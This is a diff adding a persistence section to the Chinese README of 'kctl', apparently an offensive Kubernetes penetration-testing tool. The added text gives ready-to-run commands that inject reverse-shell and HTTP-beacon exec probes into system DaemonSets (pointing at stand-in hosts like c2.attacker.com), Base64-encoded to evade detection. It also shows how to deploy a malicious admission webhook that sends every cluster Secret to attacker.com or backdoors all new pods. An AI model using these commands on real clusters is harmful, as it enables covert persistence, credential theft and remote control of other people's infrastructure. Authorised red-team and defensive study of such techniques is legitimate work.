@@ -26,6 +26,7 @@
   <a href="#快速开始">快速开始</a> •
   <a href="#运行模式">运行模式</a> •
   <a href="#golden-ticket">Golden Ticket</a> •
+  <a href="#权限维持">权限维持</a> •
   <a href="#控制台命令">命令</a> •
   <a href="#实战案例nodesproxy-权限提权">攻击案例</a> •
   <a href="#防御建议">防御</a>
@@ -51,6 +52,8 @@ kctl 是一个 Kubernetes 安全审计工具，专为渗透测试设计。支持
 | `portforward` | Kubelet | 通过 Kubelet API 端口转发 |
 | `pid2pod` | Kubelet | 将 PID 映射到 Pod 元数据 |
 | `golden` | Kubernetes | 伪造证书和 SA Token (Golden Ticket) |
+| `persist probe-inject` | Kubernetes | 注入 exec 探针实现持久化 |
+| `persist webhook-inject` | Kubernetes | 部署恶意 Admission Webhook 实现持久化 |
 
 ## 快速开始
 
@@ -234,6 +237,85 @@ kctl [kubernetes:10.0.0.1:6443]> golden sa-token --sa-key sa.key --namespace kub
 | `golden uid-list` | 列出缓存的 UID |
 | `golden test` | 验证密钥文件 |
 
+## 权限维持
+
+kctl 提供两种权限维持机制，用于在被攻陷的集群中保持访问：
+
+### 探针注入 (Probe Injection)
+
+向 DaemonSet 或 Deployment 注入 exec 探针，在每个节点上定期执行命令。
+
+```bash
+# 交互式模式
+persist probe-inject
+
+# 直接注入反弹 shell
+persist probe-inject -d kube-system/kube-proxy --payload reverse-bash --host 10.0.0.100 --port 4444
+
+# HTTP 信标
+persist probe-inject -d monitoring/node-exporter --payload http-curl --url https://c2.attacker.com/beacon
+
+# 列出带有 exec 探针的工作负载
+persist probe-list
+
+# 移除注入的探针
+persist probe-restore
+```
+
+**功能特点：**
+- 自动检测容器内可用工具（sh、bash、curl、nc、python 等）
+- 9 种 payload 模板（反弹 shell、HTTP 信标、自定义命令）
+- 支持 DaemonSet 和 Deployment 工作负载
+- Base64 编码以规避检测
+- 支持 dry-run 预览模式
+
+### 恶意 Admission Webhook
+
+部署恶意 MutatingWebhook 拦截和修改 Kubernetes 资源。
+
+```bash
+# 交互式模式
+persist webhook-inject
+
+# Secret 窃取 - 窃取所有 Secret
+persist webhook-inject -t secret-exfil --exfil-url https://attacker.com/collect
+
+# Pod 后门 - 向所有新 Pod 注入 sidecar
+persist webhook-inject -t pod-backdoor --image busybox --command "sh,-c,sleep infinity"
+
+# 外部 Webhook 服务器模式（自动生成证书）
+persist webhook-inject -t secret-exfil --external-url https://my-server:8443/webhook --cert-dir ./certs
+
+# 列出 Webhook
+persist webhook-list
+
+# 移除 Webhook
+persist webhook-restore
+```
+
+**攻击类型：**
+| 类型 | 说明 |
+|------|------|
+| `secret-exfil` | 拦截 Secret 创建/更新，外泄到外部服务器 |
+| `pod-backdoor` | 向所有新 Pod 注入恶意 sidecar 容器 |
+
+**部署模式：**
+| 模式 | 说明 |
+|------|------|
+| 集群内部署（默认） | 在集群内部署 Webhook 服务（约 6MB Go 二进制） |
+| 外部 URL 模式 | 使用外部服务器作为 Webhook 端点（自动生成证书） |
+
+### 权限维持子命令
+
+| 命令 | 说明 |
+|------|------|
+| `persist probe-inject` | 向 DaemonSet/Deployment 注入 exec 探针 |
+| `persist probe-list` | 列出带有 exec 探针的工作负载 |
+| `persist probe-restore` | 移除注入的探针 |
+| `persist webhook-inject` | 部署恶意 Admission Webhook |
+| `persist webhook-list` | 列出 Webhook 配置 |
+| `persist webhook-restore` | 移除注入的 Webhook |
+
 ## 控制台命令
 
 ### 通用命令（所有模式）
@@ -275,6 +357,12 @@ kctl [kubernetes:10.0.0.1:6443]> golden sa-token --sa-key sa.key --namespace kub
 | `golden update-uid` | 获取 SA UID 到内存 |
 | `golden uid-list` | 列出缓存的 UID |
 | `golden test` | 验证密钥文件 |
+| `persist probe-inject` | 注入 exec 探针实现持久化 |
+| `persist probe-list` | 列出带有 exec 探针的工作负载 |
+| `persist probe-restore` | 移除注入的探针 |
+| `persist webhook-inject` | 部署恶意 Webhook |
+| `persist webhook-list` | 列出 Webhook 配置 |
+| `persist webhook-restore` | 移除注入的 Webhook |
 
 ### 典型工作流程（Kubelet 模式）
 
